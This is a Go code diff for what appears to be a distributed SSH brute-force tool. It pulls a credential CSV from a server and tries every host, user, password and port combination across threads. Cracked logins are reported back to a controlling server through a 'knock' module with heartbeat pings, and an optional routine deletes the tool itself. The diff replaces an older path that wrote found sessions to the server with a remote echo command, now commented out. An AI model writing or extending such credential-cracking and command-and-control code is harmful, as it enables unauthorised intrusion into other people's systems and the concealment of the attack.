@@ -14,6 +14,7 @@ import (
 	"sort"
 	"strconv"
 	"sync"
+	knock "test/KNOCK"
 	vars "test/VARS"
 	"time"
 
@@ -46,7 +47,7 @@ func Bf(conf vars.Config) {
 	msgErr := make(chan vars.Connection)
 	go checkSession(msgSess, msgErr)
 	GetFileFromServer(conf.Flags.BrFile)
-	ReadCsv(msgSess, msgErr, conf.Flags.Combo, conf.Flags.Destr, conf.Flags.Threads)
+	ReadCsv(msgSess, msgErr, conf)
 }
 
 func checkSession(msgSess, msgErr chan vars.Connection) {
@@ -71,7 +72,7 @@ func checkSession(msgSess, msgErr chan vars.Connection) {
 
 }
 
-func ReadCsv(msgSess, msgErr chan vars.Connection, Combo, Destr bool, Threads int) {
+func ReadCsv(msgSess, msgErr chan vars.Connection, conf vars.Config) {
 
 	file, err := os.ReadFile(vars.BrFileHomeDir)
 	if err != nil {
@@ -92,13 +93,13 @@ func ReadCsv(msgSess, msgErr chan vars.Connection, Combo, Destr bool, Threads in
 	Users := []string{}
 	Passes := []string{}
 	c := vars.Connection{}
-	if Combo {
+	if conf.Flags.Combo {
 		for i, eachrecord := range records[1:] {
 			c.Host = eachrecord[0]
 			c.Username = eachrecord[1]
 			c.Password = eachrecord[2]
 			c.Port = eachrecord[3]
-			c.Place = strconv.Itoa(i+1) + "END"
+			c.Place = strconv.Itoa(i+1) + "!"
 			allC.Conn = append(allC.Conn, c)
 		}
 
@@ -123,7 +124,7 @@ func ReadCsv(msgSess, msgErr chan vars.Connection, Combo, Destr bool, Threads in
 			for b, u := range Users {
 				for cc, p := range Passes {
 					for d, po := range Ports {
-						c.Place = strconv.Itoa(a+1) + "-" + strconv.Itoa(b+1) + "-" + strconv.Itoa(cc+1) + "-" + strconv.Itoa(d+1) + "END"
+						c.Place = strconv.Itoa(a+1) + "-" + strconv.Itoa(b+1) + "-" + strconv.Itoa(cc+1) + "-" + strconv.Itoa(d+1) + "!"
 						c.Host = h
 						c.Username = u
 						c.Password = p
@@ -135,10 +136,9 @@ func ReadCsv(msgSess, msgErr chan vars.Connection, Combo, Destr bool, Threads in
 			}
 		}
 	}
-
-	finalSessionsFound := StartBruteForce(&allC, msgSess, msgErr, Threads)
-	SendFileToServer(finalSessionsFound)
-	if Destr {
+	StartBruteForce(&allC, msgSess, msgErr, conf)
+	// SendFileToServer(finalSessionsFound, conf)
+	if conf.Flags.Destr {
 		SelfDel()
 	}
 }
@@ -161,7 +161,7 @@ func SelfDel() {
 	}
 }
 
-func SendFileToServer(finalSessionsFound []vars.Connection) {
+func SendFileToServer(finalSessionsFound []vars.Connection, conf vars.Config) {
 
 	session, _, err := CreateConn(serCon)
 	if err != nil {
@@ -176,20 +176,21 @@ func SendFileToServer(finalSessionsFound []vars.Connection) {
 		stringToWrite = stringToWrite + x
 
 	}
-	fmt.Println(stringToWrite, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
-	runCommand := fmt.Sprintf("%s  -e \"%s\" >> response.txt", "echo", stringToWrite)
 
-	erra := session.Run(runCommand)
-	if erra != nil {
-		fmt.Println("error")
-	}
+	// fmt.Println(stringToWrite, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
+	// runCommand := fmt.Sprintf("%s  -e \"%s\" >> response.txt", "echo", stringToWrite)
+
+	// erra := session.Run(runCommand)
+	// if erra != nil {
+	// fmt.Println("error")
+	// }
 	b.Reset()
 }
 
-func StartBruteForce(allConn *vars.AllConnections, msgSess, msgErr chan vars.Connection, Threads int) []vars.Connection {
-	foundSessions := []vars.Connection{}
+func StartBruteForce(allConn *vars.AllConnections, msgSess, msgErr chan vars.Connection, conf vars.Config) {
+	// foundSessions := []vars.Connection{}
 	for len(allConn.Conn) != 0 {
-		for i := 1; i <= Threads; i++ {
+		for i := 1; i <= conf.Flags.Threads; i++ {
 			wg.Add(1)
 			go func() {
 				defer wg.Done()
@@ -201,8 +202,8 @@ func StartBruteForce(allConn *vars.AllConnections, msgSess, msgErr chan vars.Con
 						msgErr <- conn
 					} else if session != nil {
 						msgSess <- conn
-						foundSessions = append(foundSessions, conn)
 						session.Close()
+						knock.SendKnock(conn.Place, conf)
 					}
 				}
 			}()
@@ -211,9 +212,11 @@ func StartBruteForce(allConn *vars.AllConnections, msgSess, msgErr chan vars.Con
 		wg.Wait()
 		fmt.Println("END NEXT 3")
 		// knock.SendKnock("")
+		delay := 500 * time.Millisecond
+		knock.SendIAmAlive(conf.Server.Host, conf.Flags.KnockAlive, delay)
 		ClearList(allConn)
 	}
-	return foundSessions
+	// return foundSessions
 
 }
 
